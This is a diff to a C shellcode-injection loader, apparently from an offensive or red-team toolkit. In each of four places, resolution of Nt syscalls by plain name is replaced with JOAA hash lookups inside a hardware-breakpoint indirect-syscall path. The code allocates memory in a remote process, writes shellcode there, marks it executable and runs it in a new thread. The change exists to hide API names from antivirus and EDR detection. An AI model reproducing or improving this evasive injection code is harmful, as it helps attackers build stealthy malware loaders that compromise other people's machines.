@@ -28,7 +28,7 @@ BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pShellc
 
 	// Allocating memory in "hProcess" process of size "sSizeOfShellcode" and memory permissions set to read and write
 #ifdef HW_INDIRECT_SYSCALL
-	NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscall((char[]){'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0'});
+	NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscallHash(NtAllocateVirtualMemory_JOAA);
 	
 	if (!pNtAllocateVirtualMemory) {
 		DebugPrint("[-] Failed to prepare syscall for NtAllocateVirtualMemory.\n");
@@ -49,7 +49,7 @@ BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pShellc
 
 	// Writing the shellcode, pShellcode, to the allocated memory, pShellcodeAddress
 #ifdef HW_INDIRECT_SYSCALL
-	NtWriteVirtualMemory_t pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)PrepareSyscall((char[]){'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0'});
+	NtWriteVirtualMemory_t pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)PrepareSyscallHash(NtWriteVirtualMemory_JOAA);
 	
 	if (!pNtWriteVirtualMemory) {
 		DebugPrint("[-] Failed to prepare syscall for NtWriteVirtualMemory.\n");
@@ -75,7 +75,7 @@ BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pShellc
 
 	// Setting memory permossions at pShellcodeAddress to be executable
 #ifdef HW_INDIRECT_SYSCALL
-	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)PrepareSyscall((char[]){'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y','\0'});
+	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)PrepareSyscallHash(NtProtectVirtualMemory_JOAA);
     
     if (!pNtProtectVirtualMemory) {
         DebugPrint("[-] Failed to prepare syscall for NtProtectVirtualMemory.\n");
@@ -99,7 +99,7 @@ BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pShellc
 	// Running the shellcode as a new thread's entry in the remote process
 	DebugPrint("[i] Executing Payload ... ");
 #ifdef HW_INDIRECT_SYSCALLS
-	NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)PrepareSyscall((char[]){'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x','\0'});
+	NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)PrepareSyscallHash(NtCreateThreadEx_JOAA);
 	
 	if (!pNtCreateThreadEx) {
 		DebugPrint("[-] Failed to prepare syscall for NtCreateThreadEx.\n");
